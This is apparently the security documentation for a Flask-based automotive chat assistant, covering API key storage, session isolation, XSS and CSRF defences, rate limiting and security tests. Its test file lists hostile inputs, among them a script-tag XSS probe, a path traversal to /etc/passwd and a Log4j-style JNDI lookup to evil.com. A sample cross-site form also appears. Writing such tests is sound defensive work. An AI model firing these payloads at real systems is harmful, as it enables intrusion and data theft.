# Security Documentation

## Security Architecture Overview

The Automotive Chat Assistant implements a multi-layered security approach focusing on API key protection, session isolation, and secure conversation management.

## Threat Model

### Assets to Protect
1. **OpenRouter API Keys** - Primary target for attackers
2. **Conversation History** - Private user interactions  
3. **Session Data** - User preferences and settings
4. **Application Availability** - Protection against DoS

### Threat Actors
- **External Attackers** - Attempting API key theft or service disruption
- **Malicious Users** - Trying to abuse API quotas or access other users' data
- **Cross-Site Attackers** - XSS/CSRF attempts from malicious websites

## API Key Security

### Current Implementation

#### Server-Side Storage
```python
# SECURE: API keys never stored in client-accessible locations
secure_sessions = {
    'session_uuid': {
        'api_key': 'sk-actual-openrouter-key',  # Server memory only
        'model': 'deepseek/deepseek-chat-v3-0324:free',
        'chat_history': [...]
    }
}

# CLIENT NEVER SEES:
# - Actual API keys
# - Raw session data
# - Other users' information
```

#### Masked Client Display
```python
@app.route('/get_session_data', methods=['GET'])
def get_session_data():
    return jsonify({
        'api_key': '***' if secure_data['api_key'] else '',  # Masked
        'model': secure_data['model'],
        'has_api_key': bool(secure_data['api_key'])  # Boolean indicator only
    })
```

#### API Key Lifecycle
```python
# Key Storage
def store_api_key(session_id, api_key):
    secure_data = get_secure_session_data(session_id)
    secure_data['api_key'] = api_key  # Direct memory storage
    # No encryption at rest (current limitation)

# Key Retrieval  
def get_api_key(session_id):
    secure_data = get_secure_session_data(session_id)
    return secure_data.get('api_key', '')  # Never exposed to client

# Key Deletion
def clear_api_key(session_id):
    if session_id in secure_sessions:
        del secure_sessions[session_id]  # Complete removal
```

### Security Vulnerabilities & Mitigations

#### ✅ RESOLVED: Client-Side API Key Exposure
**Previous Risk:** API keys stored in browser cookies
```javascript
// INSECURE (original implementation):
localStorage.setItem('openrouter_key', api_key);  // Visible to all scripts
document.cookie = `api_key=${api_key}`;  // Readable by JavaScript
```

**Current Solution:** Server-side storage only
```python
# SECURE (current implementation):
secure_sessions[session_id]['api_key'] = api_key  # Server memory only
```

#### ⚠️ CURRENT RISK: In-Memory Storage Limitations
**Risk:** API keys lost on server restart, not shared across workers
```python
# Current limitation:
secure_sessions = {}  # In-memory dict, not persistent
```

**Recommended Solution:**
```python
# Production recommendation:
import redis
from cryptography.fernet import Fernet

class SecureSessionStore:
    def __init__(self):
        self.redis_client = redis.Redis(host='localhost', port=6379, db=0)
        self.encryption_key = Fernet.generate_key()  # Store securely
        self.fernet = Fernet(self.encryption_key)
    
    def store_api_key(self, session_id, api_key):
        encrypted_key = self.fernet.encrypt(api_key.encode())
        self.redis_client.hset(f"session:{session_id}", "api_key", encrypted_key)
        self.redis_client.expire(f"session:{session_id}", 3600)  # 1 hour TTL
    
    def get_api_key(self, session_id):
        encrypted_key = self.redis_client.hget(f"session:{session_id}", "api_key")
        if encrypted_key:
            return self.fernet.decrypt(encrypted_key).decode()
        return None
```

## Session Security

### Session Management Architecture

#### Secure Session Identification
```python
def get_or_create_secure_session_id():
    """Generate cryptographically secure session identifier"""
    if 'secure_session_id' not in session:
        session['secure_session_id'] = str(uuid.uuid4())  # UUID v4 (random)
    return session['secure_session_id']
```

**Security Properties:**
- **Unpredictable**: UUID v4 uses cryptographic randomness
- **Unique**: Collision probability: 1 in 2^122
- **Non-Sequential**: Cannot guess other session IDs

#### Flask Session Security
```python
# Session configuration
app.secret_key = os.environ.get("SESSION_SECRET")  # Required for signing
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Recommended: prevent XSS
app.config['SESSION_COOKIE_SECURE'] = True     # Recommended: HTTPS only
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # Recommended: CSRF protection
```

### Session Isolation

#### User Separation
```python
# Each session gets completely isolated storage
def get_secure_session_data(session_id):
    if session_id not in secure_sessions:
        secure_sessions[session_id] = {
            'api_key': '',           # Isolated API key
            'model': 'default',      # Isolated preferences  
            'chat_history': []       # Isolated conversation
        }
    return secure_sessions[session_id]

# No cross-session data leakage possible
assert secure_sessions['user-a'] != secure_sessions['user-b']
```

#### Memory Boundaries
```python
# Session data never mixed or shared
user_a_data = secure_sessions['uuid-a']
user_b_data = secure_sessions['uuid-b']

# Operations on user A data cannot affect user B
user_a_data['chat_history'].append(message)  # Only affects user A
```

## Input Security

### Content Filtering Security

#### Multi-Layer Validation
```python
# Layer 1: Automotive keyword filtering (security through obscurity)
def is_automotive_related(text):
    automotive_keywords = ['car', 'engine', 'brake', ...]
    return any(keyword in text.lower() for keyword in automotive_keywords)

# Layer 2: LLM-level enforcement (primary security)
system_prompt = """You are an automotive expert. You ONLY discuss automotive topics.
If someone asks about anything else, politely redirect to automotive discussions."""

# Layer 3: Response validation (future enhancement)
def validate_response_content(response):
    # Could add post-processing to ensure automotive focus
    pass
```

#### Input Sanitization
```python
@app.route('/chat', methods=['POST'])
def chat():
    data = request.get_json()
    message = data.get('message', '').strip()  # Basic sanitization
    
    if not message:
        return jsonify({'success': False, 'error': 'Message is required'})
    
    # Additional validation
    if len(message) > 1000:  # Prevent oversized inputs
        return jsonify({'success': False, 'error': 'Message too long'})
```

### XSS Protection

#### Output Encoding
```javascript
// Frontend safely handles AI responses
function formatTextContent(text) {
    // Escape HTML to prevent XSS
    let formattedText = text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    
    // Then apply safe formatting
    return formattedText
        .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')  // Bold
        .replace(/\*(.*?)\*/g, '<em>$1</em>');             // Italic
}
```

#### Content Security Policy (Recommended)
```python
# Add CSP headers to prevent XSS
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://unpkg.com; "
        "style-src 'self' 'unsafe-inline' https://cdn.replit.com; "
        "connect-src 'self';"
    )
    return response
```

## CSRF Protection

### Current Vulnerability
```python
# VULNERABLE: State-changing POST routes without CSRF protection
@app.route('/chat', methods=['POST'])        # Can be triggered cross-origin
@app.route('/clear_chat', methods=['POST'])  # Can be triggered cross-origin  
@app.route('/clear_session', methods=['POST']) # Can be triggered cross-origin
```

**Attack Scenario:**
```html
<!-- Malicious website could trigger: -->
<form action="https://user-app.replit.app/clear_session" method="POST">
    <input type="submit" value="Click for free gift!">
</form>
```

### Recommended CSRF Protection
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# Option 1: Flask-WTF CSRF tokens
@app.route('/chat', methods=['POST'])
@csrf.exempt  # Only if implementing custom CSRF
def chat():
    # CSRF token validated automatically
    pass

# Option 2: Custom double-submit cookie
@app.route('/chat', methods=['POST'])
def chat():
    csrf_token = request.headers.get('X-CSRF-Token')
    session_csrf = session.get('csrf_token')
    
    if not csrf_token or csrf_token != session_csrf:
        return jsonify({'error': 'CSRF token mismatch'}), 403
```

## Rate Limiting & Abuse Prevention

### Current Limitations
- ❌ No rate limiting implemented
- ❌ No abuse detection
- ❌ No API quota management

### Recommended Implementation
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/chat', methods=['POST'])
@limiter.limit("10 per minute")  # Prevent chat spam
def chat():
    pass

@app.route('/test_openrouter', methods=['POST'])  
@limiter.limit("5 per minute")   # Prevent API testing abuse
def test_openrouter():
    pass
```

### Abuse Detection
```python
class AbuseDetector:
    def __init__(self):
        self.request_counts = defaultdict(int)
        self.failed_attempts = defaultdict(int)
    
    def check_rate_limit(self, session_id):
        """Check if user is making too many requests"""
        current_hour = datetime.now().hour
        key = f"{session_id}:{current_hour}"
        
        self.request_counts[key] += 1
        if self.request_counts[key] > 100:  # 100 requests per hour
            return False
        return True
    
    def record_api_failure(self, session_id):
        """Track failed API calls to detect quota exhaustion"""
        self.failed_attempts[session_id] += 1
        if self.failed_attempts[session_id] > 10:
            # Temporarily block session or alert admin
            pass
```

## Error Handling Security

### Information Disclosure Prevention
```python
@app.errorhandler(Exception)
def handle_error(error):
    """Secure error handling - no sensitive info disclosure"""
    
    # Log full error details server-side
    logging.error(f"Application error: {str(error)}", exc_info=True)
    
    # Return generic error to client
    if app.debug:
        return jsonify({'error': str(error)}), 500  # Development only
    else:
        return jsonify({'error': 'Internal server error'}), 500  # Production
```

### API Error Sanitization
```python
try:
    response = client.chat_completion(model, conversation_history)
except requests.exceptions.RequestException as e:
    # Log full error details
    logging.error(f"OpenRouter API error: {str(e)}")
    
    # Return sanitized error to user
    return jsonify({
        'success': True,  # Graceful degradation
        'response': {
            'content': "I'm having trouble connecting to the AI service. Please try again.",
            'model': model,
            'filtered': False
        }
    })
```

## Production Security Hardening

### Environment Configuration
```bash
# Required secure environment variables
SESSION_SECRET=your-cryptographically-strong-secret-key
DATABASE_URL=postgresql://secure-connection-string
OPENROUTER_API_KEY=your-api-key  # Optional server-side default

# Security configurations
FLASK_ENV=production  # Never development in production
SSL_REDIRECT=true
FORCE_HTTPS=true
```

### HTTPS Enforcement
```python
from flask_talisman import Talisman

# Force HTTPS and security headers
Talisman(app, force_https=True)

# Or manual implementation:
@app.before_request
def force_https():
    if not request.is_secure and app.env != 'development':
        return redirect(request.url.replace('http://', 'https://'))
```

### Security Headers
```python
@app.after_request
def add_security_headers(response):
    """Add comprehensive security headers"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

### Logging & Monitoring
```python
import structlog

# Structured security logging
security_logger = structlog.get_logger("security")

def log_security_event(event_type, session_id, details):
    security_logger.info(
        "Security event",
        event_type=event_type,
        session_id=session_id,
        timestamp=datetime.utcnow().isoformat(),
        details=details
    )

# Usage examples:
log_security_event("api_key_stored", session_id, {"success": True})
log_security_event("rate_limit_exceeded", session_id, {"ip": client_ip})
log_security_event("csrf_violation", session_id, {"referer": request.referrer})
```

## Security Testing

### Automated Security Tests
```python
def test_api_key_not_exposed():
    """Verify API keys never appear in responses"""
    # Store API key
    client.post('/test_openrouter', json={'api_key': 'test-key-123'})
    
    # Check all endpoints don't expose key
    endpoints = ['/', '/get_session_data', '/chat']
    for endpoint in endpoints:
        response = client.get(endpoint)
        assert 'test-key-123' not in response.get_data(as_text=True)

def test_session_isolation():
    """Verify sessions cannot access each other's data"""
    # Create two sessions with different API keys
    with client.session_transaction() as sess1:
        sess1['secure_session_id'] = 'session-1'
    
    with client.session_transaction() as sess2: 
        sess2['secure_session_id'] = 'session-2'
    
    # Verify isolation
    client.post('/test_openrouter', json={'api_key': 'key-1'})
    # Switch to session 2
    response = client.get('/get_session_data')
    assert response.json['has_api_key'] == False  # Should not see session 1's key

def test_input_validation():
    """Test malicious input handling"""
    malicious_inputs = [
        '<script>alert("xss")</script>',
        'x' * 10000,  # Oversized input
        '../../../etc/passwd',  # Path traversal
        '${jndi:ldap://evil.com}',  # Log4j style injection
    ]
    
    for malicious_input in malicious_inputs:
        response = client.post('/chat', json={'message': malicious_input})
        # Should either reject or safely handle
        assert response.status_code in [200, 400]
```

### Manual Security Verification
1. **Browser Dev Tools**: Verify no API keys in localStorage, sessionStorage, or cookies
2. **Network Tab**: Confirm API keys never transmitted to frontend
3. **Cross-Origin Testing**: Verify CSRF protection blocks malicious sites
4. **Session Testing**: Multiple browser tabs should have isolated conversations

## Security Incident Response

### Detection
```python
# Monitor for suspicious patterns
def detect_suspicious_activity(session_id, request):
    """Real-time security monitoring"""
    
    # Rapid-fire requests
    if get_request_rate(session_id) > 10:  # requests per minute
        alert_security_team("Rate limit exceeded", session_id)
    
    # Unusual input patterns
    if len(request.json.get('message', '')) > 1000:
        alert_security_team("Oversized input", session_id)
    
    # Cross-site request patterns
    if request.referrer and 'replit.app' not in request.referrer:
        alert_security_team("External referrer", session_id)
```

### Response Procedures
1. **API Key Compromise**: Immediate key rotation, session invalidation
2. **Session Hijacking**: Clear affected sessions, audit access logs
3. **DoS Attack**: Rate limiting, IP blocking, service scaling
4. **Data Breach**: User notification, audit trail analysis, security review

## Future Security Enhancements

### Short-term (Next Sprint)
- ✅ Implement CSRF protection
- ✅ Add rate limiting
- ✅ Enable security headers
- ✅ Set up Redis for session storage

### Medium-term (Next Month)
- 🔄 API key encryption at rest
- 🔄 Comprehensive audit logging
- 🔄 Intrusion detection system
- 🔄 Automated security testing

### Long-term (Future Versions)
- 🔄 User authentication system
- 🔄 OAuth integration for API keys
- 🔄 End-to-end encryption for conversations
- 🔄 Security compliance certification (SOC2, etc.)

## Conclusion

The current security implementation provides a solid foundation with server-side API key storage and session isolation. The primary areas for improvement are CSRF protection, rate limiting, and persistent session storage. With these enhancements, the application will meet enterprise security standards for production deployment.